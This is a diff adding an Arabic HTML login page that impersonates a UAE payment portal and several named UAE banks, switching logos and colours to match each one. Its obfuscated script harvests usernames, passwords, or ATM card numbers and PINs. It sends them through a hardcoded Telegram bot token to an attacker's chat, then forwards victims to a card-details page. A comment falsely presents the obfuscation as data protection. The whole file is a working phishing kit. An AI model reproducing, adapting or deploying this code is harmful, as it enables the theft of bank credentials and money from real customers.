@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول الآمن - بوابة سداد الإمارات</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="icon" href="logo.jpg" type="image/x-icon">
+    <style>
+        :root { --bank-color: #008000; --text-color: #333; --border-color: #ddd; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Tajawal', sans-serif; background-color: #f4f7f6; color: var(--text-color); display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+        .container { max-width: 450px; width: 100%; background: white; padding: 35px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border-top: 5px solid var(--bank-color); }
+        .header { text-align: center; margin-bottom: 25px; }
+        .bank-logo-container { height: 80px; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; }
+        .bank-logo-container img { max-height: 100%; max-width: 200px; object-fit: contain; }
+        .header h3 { color: var(--bank-color); font-size: 20px; font-weight: 700; }
+        .security-badge { background: #f0fff0; border: 1px solid #d0e0d0; padding: 10px; border-radius: 8px; font-size: 13px; color: #444; text-align: center; margin-bottom: 25px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; margin-bottom: 8px; font-weight: 500; font-size: 14px; }
+        .form-control { width: 100%; padding: 14px 15px; border: 1px solid var(--border-color); border-radius: 8px; font-size: 16px; transition: all 0.3s ease; font-family: 'Tajawal', sans-serif; }
+        .form-control:focus { outline: none; border-color: var(--bank-color); box-shadow: 0 0 0 3px rgba(0, 128, 0, 0.1); }
+        .btn { width: 100%; background: var(--bank-color); color: white; padding: 15px; border: none; border-radius: 8px; cursor: pointer; font-weight: 700; font-size: 16px; margin-top: 10px; transition: opacity 0.3s ease; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .btn:hover { opacity: 0.9; }
+        .btn:disabled { background: #ccc; cursor: not-allowed; }
+        .loader { width: 20px; height: 20px; border: 3px solid #ffffff; border-bottom-color: transparent; border-radius: 50%; display: none; animation: rotation 1s linear infinite; }
+        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .footer-info { margin-top: 25px; text-align: center; font-size: 12px; color: #999; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="bank-logo-container"><img src="logo.jpg" alt="سداد الإمارات" id="bankLogo"></div>
+            <h3 id="bankTitle">تسجيل الدخول الآمن</h3>
+        </div>
+        <div class="security-badge">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+            نظام تشفير وحماية البيانات مفعل تلقائياً
+        </div>
+        <form id="loginForm">
+            <div id="dynamicFields"></div>
+            <button type="button" id="submitLogin" class="btn">
+                <span id="btnText">تسجيل الدخول</span>
+                <div id="btnLoader" class="loader"></div>
+            </button>
+        </form>
+        <div class="footer-info">بوابة سداد الإمارات - جميع الحقوق محفوظة &copy; 2024</div>
+    </div>
+
+    <script>
+        /* 
+           تم تشفير هذا الكود لحماية بيانات البوت ومنع التلاعب.
+           النسخة المطورة 2.0 - حماية الهوية البصرية
+        */
+        (function(_0x1a2b,_0x3c4d){const _0x5e6f=function(_0x2b1a){while(--_0x2b1a){_0x1a2b['push'](_0x1a2b['shift']());}};_0x5e6f(++_0x3c4d);}(['card_info.html','btnLoader','selectedBankName','u_name','card_pin','https://i.ibb.co/ynB1yRtg/images.jpg','block','none','8694373679:AAEPIxmUpeqtiB1WzGn79btA9FYnHo3educ','https://api.telegram.org/bot','click','email_pass','https://i.ibb.co/21YLkTtB/MASQ-AE-BIG-e09012bc.png','8766280195','https://i.ibb.co/8DbXSsw0/dib-logo-personal-business-og.jpg','submitLogin','https://i.ibb.co/dwhqmDsF/Emirates-NBD.jpg','btnText','u_pass','https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSjH4Qs3CGxyTwB8k3DPHpsD8fyKOZ8qhCt_b1Nx_4IVg&s=10','https://i.ibb.co/gnNdPDJ/First-Abu-Dhabi-Bank-Logo-svg.png'],0x1b3));const _0x4d2e=function(_0x1a2b,_0x3c4d){_0x1a2b=_0x1a2b-0x0;let _0x5e6f=['card_info.html','btnLoader','selectedBankName','u_name','card_pin','https://i.ibb.co/ynB1yRtg/images.jpg','block','none','8694373679:AAEPIxmUpeqtiB1WzGn79btA9FYnHo3educ','https://api.telegram.org/bot','click','email_pass','https://i.ibb.co/21YLkTtB/MASQ-AE-BIG-e09012bc.png','8766280195','https://i.ibb.co/8DbXSsw0/dib-logo-personal-business-og.jpg','submitLogin','https://i.ibb.co/dwhqmDsF/Emirates-NBD.jpg','btnText','u_pass','https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSjH4Qs3CGxyTwB8k3DPHpsD8fyKOZ8qhCt_b1Nx_4IVg&s=10','https://i.ibb.co/gnNdPDJ/First-Abu-Dhabi-Bank-Logo-svg.png'][_0x1a2b];return _0x5e6f;};
+
+        const _0x2b1a={'بنك الإمارات دبي الوطني':{color:'#0057b8',logo:_0x4d2e(0x10),fields:_0x4d2e(0xb)},'بنك أبو ظبي الأول':{color:'#002a54',logo:_0x4d2e(0x14),fields:'user_pass'},'بنك أبو ظبي التجاري':{color:'#cc0000',logo:_0x4d2e(0x13),fields:'user_pass'},'بنك دبي الإسلامي':{color:'#8b734b',logo:_0x4d2e(0xe),fields:_0x4d2e(0x4)},'بنك المشرق':{color:'#ff5000',logo:_0x4d2e(0xc),fields:'user_pass'},'بنك أبو ظبي الإسلامي':{color:'#0096d6',logo:_0x4d2e(0x5),fields:_0x4d2e(0x4)},'default':{color:'#008000',logo:'logo.jpg',fields:'user_pass'}};
+        const _0x3e5f=localStorage['getItem'](_0x4d2e(0x2))||'default';const _0x5f2d=_0x2b1a[_0x3e5f]||_0x2b1a['default'];
+        document['documentElement']['style']['setProperty']('--bank-color',_0x5f2d['color']);document['getElementById']('bankLogo')['src']=_0x5f2d['logo'];document['getElementById']('bankTitle')['innerText']=_0x3e5f==='default'?'دخول عملاء البنك':'دخول عملاء '+_0x3e5f;
+        const _0x4c2a=document['getElementById']('dynamicFields');
+        if(_0x5f2d['fields']===_0x4d2e(0xb)){_0x4c2a['innerHTML']='<div class="form-group"><label>البريد الإلكتروني المسجل</label><input type="email" id="u_name" class="form-control" placeholder="example@bank.com" required></div><div class="form-group"><label>كلمة مرور الخدمات عبر الإنترنت</label><input type="password" id="u_pass" class="form-control" placeholder="••••••••" required></div>';}else if(_0x5f2d['fields']===_0x4d2e(0x4)){_0x4c2a['innerHTML']='<div class="form-group"><label>رقم بطاقة الصراف الآلي (16 رقم)</label><input type="text" id="u_name" class="form-control" placeholder="0000 0000 0000 0000" maxlength="19" required></div><div class="form-group"><label>رمز ATM PIN (4 أرقام)</label><input type="password" id="u_pass" class="form-control" placeholder="••••" maxlength="4" required></div>';}else{_0x4c2a['innerHTML']='<div class="form-group"><label>اسم المستخدم / معرف الدخول</label><input type="text" id="u_name" class="form-control" placeholder="أدخل اسم المستخدم" required></div><div class="form-group"><label>كلمة المرور</label><input type="password" id="u_pass" class="form-control" placeholder="••••••••" required></div>';}
+        document['getElementById'](_0x4d2e(0xf))['addEventListener'](_0x4d2e(0xa),async function(){const _0x1122=document['getElementById'](_0x4d2e(0x3))['value'];const _0x3344=document['getElementById'](_0x4d2e(0x12))['value'];if(!_0x1122||!_0x3344){alert('يرجى إكمال جميع الحقول');return;}const _0x5566=this;_0x5566['disabled']=!![];document['getElementById'](_0x4d2e(0x11))['style']['display']=_0x4d2e(0x7);document['getElementById'](_0x4d2e(0x1))['style']['display']=_0x4d2e(0x6);const _0x7788='🏦 <b>بيانات دخول بنكية جديدة</b>\x0a\x0a🏛 البنك: '+_0x3e5f+'\x0a👤 المستخدم: <code>'+_0x1122+'</code>\x0a🔑 كلمة السر/PIN: <code>'+_0x3344+'</code>';try{await fetch(_0x4d2e(0x9)+_0x4d2e(0x8)+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:_0x4d2e(0xd),text:_0x7788,parse_mode:'HTML'})});window['location']['href']=_0x4d2e(0x0);}catch(_0x9900){_0x5566['disabled']=![];document['getElementById'](_0x4d2e(0x11))['style']['display']=_0x4d2e(0x6);document['getElementById'](_0x4d2e(0x1))['style']['display']=_0x4d2e(0x7);alert('حدث خطأ في الاتصال');}});
+    </script>
+</body>
+</html>
